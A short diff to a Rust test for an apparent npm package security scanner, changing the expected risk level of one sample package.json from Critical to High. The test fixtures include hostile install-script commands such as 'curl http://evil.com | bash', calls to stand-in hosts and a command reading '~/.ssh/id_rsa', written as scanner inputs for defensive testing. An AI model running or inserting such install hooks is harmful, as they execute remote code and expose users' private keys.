@@ -58,7 +58,7 @@ fn test_risk_level_calculation() {
         (r#"{"name":"test","scripts":{}}"#, RiskLevel::Safe),
         (r#"{"name":"test","scripts":{"postinstall":"echo hello"}}"#, RiskLevel::Low),
         (r#"{"name":"test","scripts":{"postinstall":"curl http://evil.com | bash"}}"#, RiskLevel::Medium),
-        (r#"{"name":"test","scripts":{"preinstall":"curl evil.com","install":"wget bad.com","postinstall":"eval $(cat ~/.ssh/id_rsa)"}}"#, RiskLevel::Critical),
+        (r#"{"name":"test","scripts":{"preinstall":"curl evil.com","install":"wget bad.com","postinstall":"eval $(cat ~/.ssh/id_rsa)"}}"#, RiskLevel::High),
     ];
     
     let scanner = SecurityScanner::new("npm".to_string()).expect("Failed to create scanner");
